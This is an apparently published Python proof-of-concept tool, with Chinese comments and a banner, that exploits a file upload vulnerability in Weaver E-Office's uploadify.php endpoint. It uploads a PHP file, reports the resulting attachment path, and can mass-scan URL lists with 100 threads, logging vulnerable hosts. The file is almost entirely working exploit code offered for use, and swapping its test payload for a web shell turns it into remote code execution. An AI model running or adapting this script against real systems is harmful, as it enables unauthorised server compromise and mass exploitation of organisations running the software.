# 泛微E-Office uploadify.php后台文件上传漏洞
import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
███████╗██╗    ██╗      ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗     ███████╗██╗██╗     ███████╗
██╔════╝██║    ██║      ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝██║██║     ██╔════╝
█████╗  ██║ █╗ ██║█████╗██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║    █████╗  ██║██║     █████╗  
██╔══╝  ██║███╗██║╚════╝██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║    ██╔══╝  ██║██║     ██╔══╝  
██║     ╚███╔███╔╝      ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝    ██║     ██║███████╗███████╗
╚═╝      ╚══╝╚══╝        ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═╝     ╚═╝╚══════╝╚══════╝
                                                                         author:daesen804
                                                                         version:1.0.0                                
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="泛微E-Office uploadify.php后台文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/inc/jquery/uploadify/uploadify.php'
    headers = {
        'Cache-Control':'max-age=0',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/118.0.5993.90Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding':'gzip,deflate,br',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Connection':'close',
        'Content-Type':'multipart/form-data;boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85',
        'Content-Length':'491',
    }
    data = "--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo 123;?>\r\n--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--\r\n"
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        response = requests.post(url=target+url_payload,headers=headers,data=data,verify=False,timeout=10)
        if response.status_code == 200 and len(response.text) == 10:
            result = target+'/attachment/'+response.text+'/test.php'
            with open("result.txt",'a') as fp:
                fp.write(target+'\n')
            print(f"[+]{target} 存在文件上传漏洞,访问路径：{result}")
        else:
            print(f"[-]{target} 不存在文件上传漏洞")
    except:
        pass
        

if __name__ == '__main__':
    main()